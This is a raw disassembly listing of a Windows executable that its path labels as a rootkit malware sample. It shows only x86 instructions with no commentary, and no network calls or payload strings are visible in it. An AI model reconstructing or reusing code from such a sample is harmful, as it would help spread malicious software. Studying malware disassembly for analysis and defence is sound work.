
malware_samples/rootkit/982ba92eff55877f6eda5e5a4f4e730a001f84ed736200e8ddea822cfb660b04.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	55                   	push   %ebp
  401001:	8b ec                	mov    %esp,%ebp
  401003:	83 ec 5c             	sub    $0x5c,%esp
  401006:	83 7d 0c 0f          	cmpl   $0xf,0xc(%ebp)
  40100a:	74 2b                	je     0x401037
  40100c:	83 7d 0c 46          	cmpl   $0x46,0xc(%ebp)
  401010:	8b 45 14             	mov    0x14(%ebp),%eax
  401013:	75 0d                	jne    0x401022
  401015:	83 48 18 10          	orl    $0x10,0x18(%eax)
  401019:	8b 0d 28 9a 42 00    	mov    0x429a28,%ecx
  40101f:	89 48 04             	mov    %ecx,0x4(%eax)
  401022:	50                   	push   %eax
  401023:	ff 75 10             	push   0x10(%ebp)
  401026:	ff 75 0c             	push   0xc(%ebp)
  401029:	ff 75 08             	push   0x8(%ebp)
  40102c:	ff 15 5c 82 40 00    	call   *0x40825c
  401032:	e9 42 01 00 00       	jmp    0x401179
  401037:	53                   	push   %ebx
  401038:	56                   	push   %esi
  401039:	8b 35 30 9a 42 00    	mov    0x429a30,%esi
  40103f:	8d 45 a4             	lea    -0x5c(%ebp),%eax
  401042:	57                   	push   %edi
  401043:	50                   	push   %eax
  401044:	ff 75 08             	push   0x8(%ebp)
  401047:	ff 15 60 82 40 00    	call   *0x408260
  40104d:	83 65 f4 00          	andl   $0x0,-0xc(%ebp)
  401051:	89 45 0c             	mov    %eax,0xc(%ebp)
  401054:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  401057:	50                   	push   %eax
  401058:	ff 75 08             	push   0x8(%ebp)
  40105b:	ff 15 64 82 40 00    	call   *0x408264
  401061:	8b 7d f0             	mov    -0x10(%ebp),%edi
  401064:	83 65 f0 00          	andl   $0x0,-0x10(%ebp)
  401068:	8b 1d 54 80 40 00    	mov    0x408054,%ebx
  40106e:	e9 80 00 00 00       	jmp    0x4010f3
  401073:	0f b6 46 52          	movzbl 0x52(%esi),%eax
  401077:	0f b6 56 56          	movzbl 0x56(%esi),%edx
  40107b:	0f af 55 e8          	imul   -0x18(%ebp),%edx
  40107f:	8b cf                	mov    %edi,%ecx
  401081:	2b 4d e8             	sub    -0x18(%ebp),%ecx
  401084:	0f af c1             	imul   %ecx,%eax
  401087:	03 c2                	add    %edx,%eax
  401089:	89 4d 10             	mov    %ecx,0x10(%ebp)
  40108c:	99                   	cltd
  40108d:	f7 ff                	idiv   %edi
  40108f:	33 d2                	xor    %edx,%edx
  401091:	8a f0                	mov    %al,%dh
  401093:	0f b6 46 51          	movzbl 0x51(%esi),%eax
  401097:	0f af c1             	imul   %ecx,%eax
  40109a:	0f b6 4e 55          	movzbl 0x55(%esi),%ecx
  40109e:	0f af 4d e8          	imul   -0x18(%ebp),%ecx
  4010a2:	03 c1                	add    %ecx,%eax
  4010a4:	8b ca                	mov    %edx,%ecx
  4010a6:	99                   	cltd
  4010a7:	f7 ff                	idiv   %edi
  4010a9:	0f b6 56 54          	movzbl 0x54(%esi),%edx
  4010ad:	0f af 55 e8          	imul   -0x18(%ebp),%edx
  4010b1:	8a c8                	mov    %al,%cl
  4010b3:	0f b6 46 50          	movzbl 0x50(%esi),%eax
  4010b7:	0f af 45 10          	imul   0x10(%ebp),%eax
  4010bb:	03 c2                	add    %edx,%eax
  4010bd:	99                   	cltd
  4010be:	f7 ff                	idiv   %edi
  4010c0:	c1 e1 08             	shl    $0x8,%ecx
  4010c3:	0f b6 c0             	movzbl %al,%eax
  4010c6:	0b c8                	or     %eax,%ecx
  4010c8:	8d 45 f4             	lea    -0xc(%ebp),%eax
  4010cb:	50                   	push   %eax
  4010cc:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  4010cf:	ff 15 58 80 40 00    	call   *0x408058
  4010d5:	83 45 f0 04          	addl   $0x4,-0x10(%ebp)
  4010d9:	89 45 14             	mov    %eax,0x14(%ebp)
  4010dc:	50                   	push   %eax
  4010dd:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  4010e0:	50                   	push   %eax
  4010e1:	ff 75 0c             	push   0xc(%ebp)
  4010e4:	ff 15 68 82 40 00    	call   *0x408268
  4010ea:	ff 75 14             	push   0x14(%ebp)
  4010ed:	ff d3                	call   *%ebx
  4010ef:	83 45 e8 04          	addl   $0x4,-0x18(%ebp)
  4010f3:	39 7d e8             	cmp    %edi,-0x18(%ebp)
  4010f6:	0f 8c 77 ff ff ff    	jl     0x401073
  4010fc:	83 7e 58 ff          	cmpl   $0xffffffff,0x58(%esi)
  401100:	74 65                	je     0x401167
  401102:	ff 76 34             	push   0x34(%esi)
  401105:	ff 15 5c 80 40 00    	call   *0x40805c
  40110b:	85 c0                	test   %eax,%eax
  40110d:	89 45 14             	mov    %eax,0x14(%ebp)
  401110:	74 55                	je     0x401167
  401112:	8b 7d 0c             	mov    0xc(%ebp),%edi
  401115:	6a 01                	push   $0x1
  401117:	57                   	push   %edi
  401118:	c7 45 e4 10 00 00 00 	movl   $0x10,-0x1c(%ebp)
  40111f:	c7 45 e8 08 00 00 00 	movl   $0x8,-0x18(%ebp)
  401126:	ff 15 60 80 40 00    	call   *0x408060
  40112c:	ff 76 58             	push   0x58(%esi)
  40112f:	57                   	push   %edi
  401130:	ff 15 64 80 40 00    	call   *0x408064
  401136:	ff 75 14             	push   0x14(%ebp)
  401139:	8b 35 50 80 40 00    	mov    0x408050,%esi
  40113f:	57                   	push   %edi
  401140:	ff d6                	call   *%esi
  401142:	89 45 0c             	mov    %eax,0xc(%ebp)
  401145:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  401148:	68 20 08 00 00       	push   $0x820
  40114d:	50                   	push   %eax
  40114e:	6a ff                	push   $0xffffffff
  401150:	68 20 8a 42 00       	push   $0x428a20
  401155:	57                   	push   %edi
  401156:	ff 15 6c 82 40 00    	call   *0x40826c
  40115c:	ff 75 0c             	push   0xc(%ebp)
  40115f:	57                   	push   %edi
  401160:	ff d6                	call   *%esi
  401162:	ff 75 14             	push   0x14(%ebp)
  401165:	ff d3                	call   *%ebx
  401167:	8d 45 a4             	lea    -0x5c(%ebp),%eax
  40116a:	50                   	push   %eax
  40116b:	ff 75 08             	push   0x8(%ebp)
  40116e:	ff 15 70 82 40 00    	call   *0x408270
  401174:	5f                   	pop    %edi
  401175:	5e                   	pop    %esi
  401176:	33 c0                	xor    %eax,%eax
  401178:	5b                   	pop    %ebx
  401179:	c9                   	leave
  40117a:	c2 10 00             	ret    $0x10
  40117d:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  401181:	a1 48 9a 42 00       	mov    0x429a48,%eax
  401186:	8b d1                	mov    %ecx,%edx
  401188:	53                   	push   %ebx
  401189:	69 d2 18 08 00 00    	imul   $0x818,%edx,%edx
  40118f:	56                   	push   %esi
  401190:	57                   	push   %edi
  401191:	8b 54 02 08          	mov    0x8(%edx,%eax,1),%edx
  401195:	f6 c2 02             	test   $0x2,%dl
  401198:	74 4f                	je     0x4011e9
  40119a:	8d 71 01             	lea    0x1(%ecx),%esi
  40119d:	33 ff                	xor    %edi,%edi
  40119f:	3b 35 4c 9a 42 00    	cmp    0x429a4c,%esi
  4011a5:	73 42                	jae    0x4011e9
  4011a7:	8b ce                	mov    %esi,%ecx
  4011a9:	69 c9 18 08 00 00    	imul   $0x818,%ecx,%ecx
  4011af:	8d 44 01 08          	lea    0x8(%ecx,%eax,1),%eax
  4011b3:	8b 08                	mov    (%eax),%ecx
  4011b5:	f6 c1 02             	test   $0x2,%cl
  4011b8:	74 03                	je     0x4011bd
  4011ba:	47                   	inc    %edi
  4011bb:	eb 1e                	jmp    0x4011db
  4011bd:	f6 c1 04             	test   $0x4,%cl
  4011c0:	74 09                	je     0x4011cb
  4011c2:	8b cf                	mov    %edi,%ecx
  4011c4:	4f                   	dec    %edi
  4011c5:	85 c9                	test   %ecx,%ecx
  4011c7:	74 20                	je     0x4011e9
  4011c9:	eb 10                	jmp    0x4011db
  4011cb:	f6 c1 10             	test   $0x10,%cl
  4011ce:	75 0b                	jne    0x4011db
  4011d0:	8b d9                	mov    %ecx,%ebx
  4011d2:	33 da                	xor    %edx,%ebx
  4011d4:	83 e3 01             	and    $0x1,%ebx
  4011d7:	33 d9                	xor    %ecx,%ebx
  4011d9:	89 18                	mov    %ebx,(%eax)
  4011db:	46                   	inc    %esi
  4011dc:	05 18 08 00 00       	add    $0x818,%eax
  4011e1:	3b 35 4c 9a 42 00    	cmp    0x429a4c,%esi
  4011e7:	72 ca                	jb     0x4011b3
  4011e9:	5f                   	pop    %edi
  4011ea:	5e                   	pop    %esi
  4011eb:	5b                   	pop    %ebx
  4011ec:	c2 04 00             	ret    $0x4
  4011ef:	55                   	push   %ebp
  4011f0:	8b ec                	mov    %esp,%ebp
  4011f2:	51                   	push   %ecx
  4011f3:	51                   	push   %ecx
  4011f4:	8b 55 08             	mov    0x8(%ebp),%edx
  4011f7:	53                   	push   %ebx
  4011f8:	56                   	push   %esi
  4011f9:	8b f2                	mov    %edx,%esi
  4011fb:	69 f6 18 08 00 00    	imul   $0x818,%esi,%esi
  401201:	8b 1d 48 9a 42 00    	mov    0x429a48,%ebx
  401207:	33 c9                	xor    %ecx,%ecx
  401209:	03 f3                	add    %ebx,%esi
  40120b:	57                   	push   %edi
  40120c:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  40120f:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  401212:	8b 46 08             	mov    0x8(%esi),%eax
  401215:	a8 02                	test   $0x2,%al
  401217:	74 0b                	je     0x401224
  401219:	39 4d 0c             	cmp    %ecx,0xc(%ebp)
  40121c:	74 06                	je     0x401224
  40121e:	24 be                	and    $0xbe,%al
  401220:	42                   	inc    %edx
  401221:	89 46 08             	mov    %eax,0x8(%esi)
  401224:	3b 15 4c 9a 42 00    	cmp    0x429a4c,%edx
  40122a:	73 44                	jae    0x401270
  40122c:	8b c2                	mov    %edx,%eax
  40122e:	69 c0 18 08 00 00    	imul   $0x818,%eax,%eax
  401234:	8d 7c 18 08          	lea    0x8(%eax,%ebx,1),%edi
  401238:	8d 42 01             	lea    0x1(%edx),%eax
  40123b:	8b 0f                	mov    (%edi),%ecx
  40123d:	f6 c1 02             	test   $0x2,%cl
  401240:	74 0a                	je     0x40124c
  401242:	6a 01                	push   $0x1
  401244:	52                   	push   %edx
  401245:	e8 a5 ff ff ff       	call   0x4011ef
  40124a:	8b 0f                	mov    (%edi),%ecx
  40124c:	f6 c1 04             	test   $0x4,%cl
  40124f:	75 28                	jne    0x401279
  401251:	f6 c1 40             	test   $0x40,%cl
  401254:	74 03                	je     0x401259
  401256:	ff 45 fc             	incl   -0x4(%ebp)
  401259:	f6 c1 01             	test   $0x1,%cl
  40125c:	74 05                	je     0x401263
  40125e:	ff 45 fc             	incl   -0x4(%ebp)
  401261:	eb 03                	jmp    0x401266
  401263:	ff 45 f8             	incl   -0x8(%ebp)
  401266:	3b 05 4c 9a 42 00    	cmp    0x429a4c,%eax
  40126c:	8b d0                	mov    %eax,%edx
  40126e:	72 bc                	jb     0x40122c
  401270:	33 c0                	xor    %eax,%eax
  401272:	5f                   	pop    %edi
  401273:	5e                   	pop    %esi
  401274:	5b                   	pop    %ebx
  401275:	c9                   	leave
  401276:	c2 08 00             	ret    $0x8
  401279:	83 7d fc 00          	cmpl   $0x0,-0x4(%ebp)
  40127d:	74 f3                	je     0x401272
  40127f:	83 7d f8 00          	cmpl   $0x0,-0x8(%ebp)
  401283:	74 06                	je     0x40128b
  401285:	83 4e 08 40          	orl    $0x40,0x8(%esi)
  401289:	eb e7                	jmp    0x401272
  40128b:	8b 4e 08             	mov    0x8(%esi),%ecx
  40128e:	80 e1 7f             	and    $0x7f,%cl
  401291:	83 c9 01             	or     $0x1,%ecx
  401294:	89 4e 08             	mov    %ecx,0x8(%esi)
  401297:	eb d9                	jmp    0x401272
  401299:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  40129d:	a1 48 9a 42 00       	mov    0x429a48,%eax
  4012a2:	56                   	push   %esi
  4012a3:	33 f6                	xor    %esi,%esi
  4012a5:	83 f9 20             	cmp    $0x20,%ecx
  4012a8:	73 34                	jae    0x4012de
  4012aa:	39 35 4c 9a 42 00    	cmp    %esi,0x429a4c
  4012b0:	76 2c                	jbe    0x4012de
  4012b2:	8d 50 08             	lea    0x8(%eax),%edx
  4012b5:	57                   	push   %edi
  4012b6:	8b 02                	mov    (%edx),%eax
  4012b8:	a8 06                	test   $0x6,%al
  4012ba:	75 12                	jne    0x4012ce
  4012bc:	33 ff                	xor    %edi,%edi
  4012be:	47                   	inc    %edi
  4012bf:	d3 e7                	shl    %cl,%edi
  4012c1:	85 7a fc             	test   %edi,-0x4(%edx)
  4012c4:	74 04                	je     0x4012ca
  4012c6:	0c 01                	or     $0x1,%al
  4012c8:	eb 02                	jmp    0x4012cc
  4012ca:	24 fe                	and    $0xfe,%al
  4012cc:	89 02                	mov    %eax,(%edx)
  4012ce:	46                   	inc    %esi
  4012cf:	81 c2 18 08 00 00    	add    $0x818,%edx
  4012d5:	3b 35 4c 9a 42 00    	cmp    0x429a4c,%esi
  4012db:	72 d9                	jb     0x4012b6
  4012dd:	5f                   	pop    %edi
  4012de:	5e                   	pop    %esi
  4012df:	c2 04 00             	ret    $0x4
  4012e2:	55                   	push   %ebp
  4012e3:	8b ec                	mov    %esp,%ebp
  4012e5:	83 ec 0c             	sub    $0xc,%esp
  4012e8:	a1 30 9a 42 00       	mov    0x429a30,%eax
  4012ed:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  4012f1:	53                   	push   %ebx
  4012f2:	56                   	push   %esi
  4012f3:	05 94 00 00 00       	add    $0x94,%eax
  4012f8:	57                   	push   %edi
  4012f9:	8b 3d 4c 9a 42 00    	mov    0x429a4c,%edi
  4012ff:	89 45 f8             	mov    %eax,-0x8(%ebp)
  401302:	8b 45 f8             	mov    -0x8(%ebp),%eax
  401305:	33 db                	xor    %ebx,%ebx
  401307:	39 18                	cmp    %ebx,(%eax)
  401309:	74 4b                	je     0x401356
  40130b:	3b df                	cmp    %edi,%ebx
  40130d:	73 45                	jae    0x401354
  40130f:	8b 35 48 9a 42 00    	mov    0x429a48,%esi
  401315:	83 c6 08             	add    $0x8,%esi
  401318:	8b 16                	mov    (%esi),%edx
  40131a:	f6 c2 06             	test   $0x6,%dl
  40131d:	75 28                	jne    0x401347
  40131f:	8b 45 08             	mov    0x8(%ebp),%eax
  401322:	85 c0                	test   %eax,%eax
  401324:	74 06                	je     0x40132c
  401326:	83 3c 98 00          	cmpl   $0x0,(%eax,%ebx,4)
  40132a:	74 1b                	je     0x401347
  40132c:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40132f:	33 c0                	xor    %eax,%eax
  401331:	40                   	inc    %eax
  401332:	83 e2 01             	and    $0x1,%edx
  401335:	d3 e0                	shl    %cl,%eax
  401337:	8b 4e fc             	mov    -0x4(%esi),%ecx
  40133a:	23 c8                	and    %eax,%ecx
  40133c:	8b c1                	mov    %ecx,%eax
  40133e:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  401341:	d3 e2                	shl    %cl,%edx
  401343:	3b c2                	cmp    %edx,%eax
  401345:	75 0b                	jne    0x401352
  401347:	43                   	inc    %ebx
  401348:	81 c6 18 08 00 00    	add    $0x818,%esi
  40134e:	3b df                	cmp    %edi,%ebx
  401350:	72 c6                	jb     0x401318
  401352:	3b df                	cmp    %edi,%ebx
  401354:	74 0d                	je     0x401363
  401356:	ff 45 fc             	incl   -0x4(%ebp)
  401359:	83 45 f8 04          	addl   $0x4,-0x8(%ebp)
  40135d:	83 7d fc 20          	cmpl   $0x20,-0x4(%ebp)
  401361:	72 9f                	jb     0x401302
  401363:	8b 45 fc             	mov    -0x4(%ebp),%eax
  401366:	5f                   	pop    %edi
  401367:	5e                   	pop    %esi
  401368:	5b                   	pop    %ebx
  401369:	c9                   	leave
  40136a:	c2 04 00             	ret    $0x4
  40136d:	8b 44 24 04          	mov    0x4(%esp),%eax
  401371:	85 c0                	test   %eax,%eax
  401373:	7d 11                	jge    0x401386
  401375:	40                   	inc    %eax
  401376:	b9 00 a0 42 00       	mov    $0x42a000,%ecx
  40137b:	c1 e0 0b             	shl    $0xb,%eax
  40137e:	2b c8                	sub    %eax,%ecx
  401380:	51                   	push   %ecx
  401381:	e8 63 51 00 00       	call   0x4064e9
  401386:	c2 04 00             	ret    $0x4
  401389:	56                   	push   %esi
  40138a:	8b 74 24 08          	mov    0x8(%esp),%esi
  40138e:	eb 6a                	jmp    0x4013fa
  401390:	8b c6                	mov    %esi,%eax
  401392:	8b 0d 50 9a 42 00    	mov    0x429a50,%ecx
  401398:	6b c0 1c             	imul   $0x1c,%eax,%eax
  40139b:	03 c1                	add    %ecx,%eax
  40139d:	83 38 01             	cmpl   $0x1,(%eax)
  4013a0:	74 5c                	je     0x4013fe
  4013a2:	50                   	push   %eax
  4013a3:	e8 8c 00 00 00       	call   0x401434
  4013a8:	3d ff ff ff 7f       	cmp    $0x7fffffff,%eax
  4013ad:	74 55                	je     0x401404
  4013af:	50                   	push   %eax
  4013b0:	e8 b8 ff ff ff       	call   0x40136d
  4013b5:	85 c0                	test   %eax,%eax
  4013b7:	75 04                	jne    0x4013bd
  4013b9:	40                   	inc    %eax
  4013ba:	46                   	inc    %esi
  4013bb:	eb 07                	jmp    0x4013c4
  4013bd:	48                   	dec    %eax
  4013be:	8b ce                	mov    %esi,%ecx
  4013c0:	8b f0                	mov    %eax,%esi
  4013c2:	2b c1                	sub    %ecx,%eax
  4013c4:	83 7c 24 0c 00       	cmpl   $0x0,0xc(%esp)
  4013c9:	74 2f                	je     0x4013fa
  4013cb:	01 05 0c 8a 42 00    	add    %eax,0x428a0c
  4013d1:	6a 00                	push   $0x0
  4013d3:	ff 35 f4 89 42 00    	push   0x4289f4
  4013d9:	68 30 75 00 00       	push   $0x7530
  4013de:	ff 35 0c 8a 42 00    	push   0x428a0c
  4013e4:	ff 15 48 81 40 00    	call   *0x408148
  4013ea:	50                   	push   %eax
  4013eb:	68 02 04 00 00       	push   $0x402
  4013f0:	ff 74 24 18          	push   0x18(%esp)
  4013f4:	ff 15 58 82 40 00    	call   *0x408258
  4013fa:	85 f6                	test   %esi,%esi
  4013fc:	7d 92                	jge    0x401390
  4013fe:	33 c0                	xor    %eax,%eax
  401400:	5e                   	pop    %esi
  401401:	c2 08 00             	ret    $0x8
  401404:	b8 ff ff ff 7f       	mov    $0x7fffffff,%eax
  401409:	eb f5                	jmp    0x401400
  40140b:	8b 44 24 04          	mov    0x4(%esp),%eax
  40140f:	8b 0d 30 9a 42 00    	mov    0x429a30,%ecx
  401415:	6a 00                	push   $0x0
  401417:	ff 74 81 6c          	push   0x6c(%ecx,%eax,4)
  40141b:	e8 69 ff ff ff       	call   0x401389
  401420:	c2 04 00             	ret    $0x4
  401423:	68 c8 ad 40 00       	push   $0x40adc8
  401428:	ff 74 24 08          	push   0x8(%esp)
  40142c:	e8 dd 41 00 00       	call   0x40560e
  401431:	c2 04 00             	ret    $0x4
  401434:	55                   	push   %ebp
  401435:	8b ec                	mov    %esp,%ebp
  401437:	81 ec dc 02 00 00    	sub    $0x2dc,%esp
  40143d:	53                   	push   %ebx
  40143e:	56                   	push   %esi
  40143f:	8b 75 08             	mov    0x8(%ebp),%esi
  401442:	57                   	push   %edi
  401443:	a1 28 9a 42 00       	mov    0x429a28,%eax
  401448:	6a 07                	push   $0x7
  40144a:	59                   	pop    %ecx
  40144b:	8d 7d cc             	lea    -0x34(%ebp),%edi
  40144e:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  401450:	8b 4d d4             	mov    -0x2c(%ebp),%ecx
  401453:	8b 55 cc             	mov    -0x34(%ebp),%edx
  401456:	be 00 a0 42 00       	mov    $0x42a000,%esi
  40145b:	89 45 f8             	mov    %eax,-0x8(%ebp)
  40145e:	8b 45 d0             	mov    -0x30(%ebp),%eax
  401461:	33 db                	xor    %ebx,%ebx
  401463:	c1 e1 0b             	shl    $0xb,%ecx
  401466:	03 ce                	add    %esi,%ecx
  401468:	8b f8                	mov    %eax,%edi
  40146a:	89 4d f4             	mov    %ecx,-0xc(%ebp)
  40146d:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  401470:	c1 e7 0b             	shl    $0xb,%edi
  401473:	89 0d 24 ce 40 00    	mov    %ecx,0x40ce24
  401479:	8d 4a fe             	lea    -0x2(%edx),%ecx
  40147c:	03 fe                	add    %esi,%edi
  40147e:	83 f9 43             	cmp    $0x43,%ecx
  401481:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  401484:	0f 87 cc 17 00 00    	ja     0x402c56
  40148a:	ff 24 8d 68 2c 40 00 	jmp    *0x402c68(,%ecx,4)
  401491:	53                   	push   %ebx
  401492:	50                   	push   %eax
  401493:	e8 76 41 00 00       	call   0x40560e
  401498:	e9 2c 0f 00 00       	jmp    0x4023c9
  40149d:	ff 05 ec 89 42 00    	incl   0x4289ec
  4014a3:	39 5d f8             	cmp    %ebx,-0x8(%ebp)
  4014a6:	0f 84 1d 0f 00 00    	je     0x4023c9
  4014ac:	53                   	push   %ebx
  4014ad:	ff 15 20 82 40 00    	call   *0x408220
  4014b3:	e9 11 0f 00 00       	jmp    0x4023c9
  4014b8:	50                   	push   %eax
  4014b9:	e8 af fe ff ff       	call   0x40136d
  4014be:	48                   	dec    %eax
  4014bf:	53                   	push   %ebx
  4014c0:	50                   	push   %eax
  4014c1:	e8 c3 fe ff ff       	call   0x401389
  4014c6:	e9 96 17 00 00       	jmp    0x402c61
  4014cb:	53                   	push   %ebx
  4014cc:	50                   	push   %eax
  4014cd:	e8 3c 41 00 00       	call   0x40560e
  4014d2:	e9 7f 17 00 00       	jmp    0x402c56
  4014d7:	53                   	push   %ebx
  4014d8:	e8 d3 18 00 00       	call   0x402db0
  4014dd:	83 f8 01             	cmp    $0x1,%eax
  4014e0:	59                   	pop    %ecx
  4014e1:	89 55 f0             	mov    %edx,-0x10(%ebp)
  4014e4:	7f 03                	jg     0x4014e9
  4014e6:	33 c0                	xor    %eax,%eax
  4014e8:	40                   	inc    %eax
  4014e9:	50                   	push   %eax
  4014ea:	ff 15 d4 80 40 00    	call   *0x4080d4
  4014f0:	e9 61 17 00 00       	jmp    0x402c56
  4014f5:	ff 75 f8             	push   -0x8(%ebp)
  4014f8:	ff 15 24 82 40 00    	call   *0x408224
  4014fe:	e9 53 17 00 00       	jmp    0x402c56
  401503:	39 5d d8             	cmp    %ebx,-0x28(%ebp)
  401506:	7f 39                	jg     0x401541
  401508:	7d 0e                	jge    0x401518
  40150a:	8b 04 85 a0 9a 42 00 	mov    0x429aa0(,%eax,4),%eax
  401511:	a3 2c ce 40 00       	mov    %eax,0x40ce2c
  401516:	eb 0f                	jmp    0x401527
  401518:	c1 e0 02             	shl    $0x2,%eax
  40151b:	8b 88 a0 9a 42 00    	mov    0x429aa0(%eax),%ecx
  401521:	89 88 00 9b 42 00    	mov    %ecx,0x429b00(%eax)
  401527:	6a 01                	push   $0x1
  401529:	e8 82 18 00 00       	call   0x402db0
  40152e:	59                   	pop    %ecx
  40152f:	89 55 f0             	mov    %edx,-0x10(%ebp)
  401532:	8b 4d d0             	mov    -0x30(%ebp),%ecx
  401535:	89 04 8d a0 9a 42 00 	mov    %eax,0x429aa0(,%ecx,4)
  40153c:	e9 15 17 00 00       	jmp    0x402c56
  401541:	c1 e0 02             	shl    $0x2,%eax
  401544:	39 5d dc             	cmp    %ebx,-0x24(%ebp)
  401547:	8d 88 a0 9a 42 00    	lea    0x429aa0(%eax),%ecx
  40154d:	8b 80 00 9b 42 00    	mov    0x429b00(%eax),%eax
  401553:	89 01                	mov    %eax,(%ecx)
  401555:	0f 8d fb 16 00 00    	jge    0x402c56
  40155b:	a1 2c ce 40 00       	mov    0x40ce2c,%eax
  401560:	89 01                	mov    %eax,(%ecx)
  401562:	e9 ef 16 00 00       	jmp    0x402c56
  401567:	8b 45 d8             	mov    -0x28(%ebp),%eax
  40156a:	8d 34 85 a0 9a 42 00 	lea    0x429aa0(,%eax,4),%esi
  401571:	33 c0                	xor    %eax,%eax
  401573:	8b 0e                	mov    (%esi),%ecx
  401575:	3b cb                	cmp    %ebx,%ecx
  401577:	0f 94 c0             	sete   %al
  40157a:	23 4d dc             	and    -0x24(%ebp),%ecx
  40157d:	8b 44 85 d0          	mov    -0x30(%ebp,%eax,4),%eax
  401581:	89 0e                	mov    %ecx,(%esi)
  401583:	e9 d9 16 00 00       	jmp    0x402c61
  401588:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  40158b:	ff 34 85 a0 9a 42 00 	push   0x429aa0(,%eax,4)
  401592:	57                   	push   %edi
  401593:	e9 38 16 00 00       	jmp    0x402bd0
  401598:	8b 0d f0 89 42 00    	mov    0x4289f0,%ecx
  40159e:	8b 35 28 82 40 00    	mov    0x408228,%esi
  4015a4:	3b cb                	cmp    %ebx,%ecx
  4015a6:	74 09                	je     0x4015b1
  4015a8:	ff 75 d4             	push   -0x2c(%ebp)
  4015ab:	51                   	push   %ecx
  4015ac:	ff d6                	call   *%esi
  4015ae:	8b 45 d0             	mov    -0x30(%ebp),%eax
  4015b1:	8b 0d 04 8a 42 00    	mov    0x428a04,%ecx
  4015b7:	3b cb                	cmp    %ebx,%ecx
  4015b9:	0f 84 97 16 00 00    	je     0x402c56
  4015bf:	50                   	push   %eax
  4015c0:	51                   	push   %ecx
  4015c1:	ff d6                	call   *%esi
  4015c3:	e9 8e 16 00 00       	jmp    0x402c56
  4015c8:	6a f0                	push   $0xfffffff0
  4015ca:	e8 03 18 00 00       	call   0x402dd2
  4015cf:	ff 75 d4             	push   -0x2c(%ebp)
  4015d2:	50                   	push   %eax
  4015d3:	ff 15 d8 80 40 00    	call   *0x4080d8
  4015d9:	85 c0                	test   %eax,%eax
  4015db:	0f 85 75 16 00 00    	jne    0x402c56
  4015e1:	e9 74 13 00 00       	jmp    0x40295a
  4015e6:	6a f0                	push   $0xfffffff0
  4015e8:	e8 e5 17 00 00       	call   0x402dd2
  4015ed:	50                   	push   %eax
  4015ee:	89 45 08             	mov    %eax,0x8(%ebp)
  4015f1:	e8 0d 49 00 00       	call   0x405f03
  4015f6:	8b f0                	mov    %eax,%esi
  4015f8:	3b f3                	cmp    %ebx,%esi
  4015fa:	74 61                	je     0x40165d
  4015fc:	6a 5c                	push   $0x5c
  4015fe:	56                   	push   %esi
  4015ff:	e8 81 48 00 00       	call   0x405e85
  401604:	8b f0                	mov    %eax,%esi
  401606:	66 8b 3e             	mov    (%esi),%di
  401609:	66 89 1e             	mov    %bx,(%esi)
  40160c:	66 3b fb             	cmp    %bx,%di
  40160f:	75 1f                	jne    0x401630
  401611:	39 5d d8             	cmp    %ebx,-0x28(%ebp)
  401614:	74 1a                	je     0x401630
  401616:	e8 39 45 00 00       	call   0x405b54
  40161b:	85 c0                	test   %eax,%eax
  40161d:	74 11                	je     0x401630
  40161f:	ff 75 08             	push   0x8(%ebp)
  401622:	e8 b6 44 00 00       	call   0x405add
  401627:	3b c3                	cmp    %ebx,%eax
  401629:	74 28                	je     0x401653
  40162b:	ff 45 fc             	incl   -0x4(%ebp)
  40162e:	eb 08                	jmp    0x401638
  401630:	ff 75 08             	push   0x8(%ebp)
  401633:	e8 ff 44 00 00       	call   0x405b37
  401638:	3b c3                	cmp    %ebx,%eax
  40163a:	74 17                	je     0x401653
  40163c:	3d b7 00 00 00       	cmp    $0xb7,%eax
  401641:	75 0d                	jne    0x401650
  401643:	ff 75 08             	push   0x8(%ebp)
  401646:	ff 15 dc 80 40 00    	call   *0x4080dc
  40164c:	a8 10                	test   $0x10,%al
  40164e:	75 03                	jne    0x401653
  401650:	ff 45 fc             	incl   -0x4(%ebp)
  401653:	66 89 3e             	mov    %di,(%esi)
  401656:	46                   	inc    %esi
  401657:	46                   	inc    %esi
  401658:	66 3b fb             	cmp    %bx,%di
  40165b:	75 9f                	jne    0x4015fc
  40165d:	39 5d d4             	cmp    %ebx,-0x2c(%ebp)
  401660:	74 2d                	je     0x40168f
  401662:	6a e6                	push   $0xffffffe6
  401664:	e8 ba fd ff ff       	call   0x401423
  401669:	ff 75 08             	push   0x8(%ebp)
  40166c:	68 00 50 43 00       	push   $0x435000
  401671:	e8 13 4f 00 00       	call   0x406589
  401676:	ff 75 08             	push   0x8(%ebp)
  401679:	ff 15 e0 80 40 00    	call   *0x4080e0
  40167f:	85 c0                	test   %eax,%eax
  401681:	0f 85 cf 15 00 00    	jne    0x402c56
  401687:	ff 45 fc             	incl   -0x4(%ebp)
  40168a:	e9 c7 15 00 00       	jmp    0x402c56
  40168f:	6a f5                	push   $0xfffffff5
  401691:	e9 87 0c 00 00       	jmp    0x40231d
  401696:	53                   	push   %ebx
  401697:	e8 36 17 00 00       	call   0x402dd2
  40169c:	50                   	push   %eax
  40169d:	e8 44 52 00 00       	call   0x4068e6
  4016a2:	e9 ad 06 00 00       	jmp    0x401d54
  4016a7:	6a d0                	push   $0xffffffd0
  4016a9:	e8 24 17 00 00       	call   0x402dd2
  4016ae:	6a df                	push   $0xffffffdf
  4016b0:	8b f0                	mov    %eax,%esi
  4016b2:	e8 1b 17 00 00       	call   0x402dd2
  4016b7:	6a 13                	push   $0x13
  4016b9:	8b f8                	mov    %eax,%edi
  4016bb:	e8 12 17 00 00       	call   0x402dd2
  4016c0:	57                   	push   %edi
  4016c1:	56                   	push   %esi
  4016c2:	ff 15 e4 80 40 00    	call   *0x4080e4
  4016c8:	85 c0                	test   %eax,%eax
  4016ca:	74 07                	je     0x4016d3
  4016cc:	6a e3                	push   $0xffffffe3
